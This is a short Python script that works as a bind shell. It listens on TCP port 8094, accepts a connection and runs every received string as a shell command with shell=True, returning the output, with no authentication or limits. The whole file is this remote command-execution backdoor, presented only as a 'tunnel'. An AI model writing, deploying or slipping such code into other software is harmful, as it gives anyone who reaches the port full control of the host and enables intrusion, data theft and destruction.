import socket
import subprocess

serversideSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serversideSocket.bind((socket.gethostname(), 8094))
serversideSocket.listen(5)

serverproxySocket, address = serversideSocket.accept()
print("Tunnel has been established")

while True:
    msg = serverproxySocket.recv(1024)
    decodedMsg = msg.decode("utf-8")
    subprocess2 = subprocess.Popen(decodedMsg, shell=True, stdout=subprocess.PIPE)
    response = str(subprocess2.stdout.read())
    
    #print(response)
    serverproxySocket.send(bytes(response, "utf-8"))

serverproxySocket.close()
serversideSocket.close()